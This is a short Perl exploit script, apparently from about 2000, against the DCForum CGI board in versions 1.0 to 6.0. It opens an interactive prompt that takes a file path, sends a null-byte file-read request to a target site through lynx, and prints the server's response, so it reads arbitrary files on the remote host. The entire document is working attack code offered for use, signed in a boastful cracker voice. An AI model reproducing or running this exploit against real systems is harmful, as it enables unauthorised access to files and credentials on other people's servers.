
#!/usr/bin/perl
# DC Forum Vulnerablitiy(Found In Versions From 1.0 - 6.0 According To
CGISecurity.com Advisory)
# Exploits Vulnerability That Allows Remote File Reading
# By SteeLe
# BEGIN { open(STDERR,">errors.txt"); } error checking
$lynx = "/usr/bin/lynx"; # specify

$site = $ARGV[0];
$cgi  = $ARGV[1];
$inet = inet_aton($site);

die "\n\t---   Usage:$0 <site> <cgi location,duh>  ---" if(@ARGV == '0' ||
@ARGV < 2);

print "\n\t---   DCForum 1.0 - 6.0 Exploit ---";
print "\n\t---   By the cool fellas at *   ---\n\n";

while(true) { # yea i think I stole this from the pollex.pl , uh thanks.

print "[dcforum]Option:";
$action = <STDIN>;
chomp($action);

print "Valid Options: r(read files, usage r <file>), q(quit)\n" if($action
ne "r" || $action ne "q");

if ($action eq "r") {
print "\nFile(to read):";
$file = <STDIN>;
chomp($file);
# Old fashion shit, and I was lazy so be happy
$url = "?az=list&file=$file%00";
$site = `$lynx http://$site$cgi$url`;
print $site;
}
elsif ($action eq "q") {
 print "now exiting program\n";
 exit;
  }
}
# (c) 2000 [Warez To Tha Extreme(Damn Thats A Lie)]
